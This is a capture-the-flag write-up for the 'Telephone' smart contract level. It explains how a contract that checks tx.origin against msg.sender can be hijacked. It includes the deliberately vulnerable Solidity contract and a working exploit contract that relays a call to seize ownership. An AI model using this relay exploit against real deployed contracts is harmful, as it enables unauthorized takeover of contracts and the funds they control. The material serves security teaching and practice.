
# Telephone - Transaction Headers
---

## Challenge Description


> Claim ownership of the contract below to complete this level.

Sounds pretty straight forward, lets take a look at the contract:

```solidity
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

contract Telephone { 	
	address public owner; 
	
	constructor() {
		owner = msg.sender;
	}
	
	function changeOwner(address _owner) public {
		if (tx.origin != msg.sender) {
			owner = _owner; 
		} 
	}
}
```

## Solution

We can see that there is a function **ChangeOwner** that we can call and will make us owner, we just need to satisfy the if statement.

### tx.origin VS msg.sender

The **msg.sender** is the present public key of the caller of the function, as opposed to **tx.origin** (tx stands for transaction) as the name implies, is the public key of the first wallet that initiated the transaction.
**tx.origin** can only be an external account (not a contract) as opposed to **msg.sender** that can be both an external account and a contract account. (contracts cannot initiate transactions, they are only immediate accounts)

Now after we know that, lets think how can the msg.sender be different from the tx.origin?
We will deploy a middle contract that will help us.

First declare on the interface of the Telephone Contract so we could easily call **changeOwner** function:

```solidity
interface TelephoneMimic {
	function changeOwner(address _owner) external;
}
```

Now lets create the exploit contract:
```solidity
contract TelephoneExploit {
	address private remoteContractAddress = 0x41421aa6cc00d2B3DF00489f06393f5328649fCD;

	receive() external payable {
		TelephoneMimic remoteContract = TelephoneMimic(remoteContractAddress);

		remoteContract.changeOwner(msg.sender);
	}
}
```

And now when we will call the default transaction of out exploit contract it will call the **changeOwner** function of the Telephone contract with out address as the new owner.
This will pass the test:
```solidity
if (tx.origin != msg.sender)
```
because the msg.sender is the address of the exploit contract, and the tx.origin is the address of our wallet, because we were the ones that initiated the transaction.
Thats it, we are the owners of this contract!

## Final Code

```solidity
pragma solidity ^0.8.0;

interface TelephoneMimic {
	function changeOwner(address _owner) external;
}

contract TelephoneExploit {
	address private remoteContractAddress = 0x41421aa6cc00d2B3DF00489f06393f5328649fCD;

	receive() external payable {
		TelephoneMimic remoteContract = TelephoneMimic(remoteContractAddress);

		remoteContract.changeOwner(msg.sender);
	}
}
```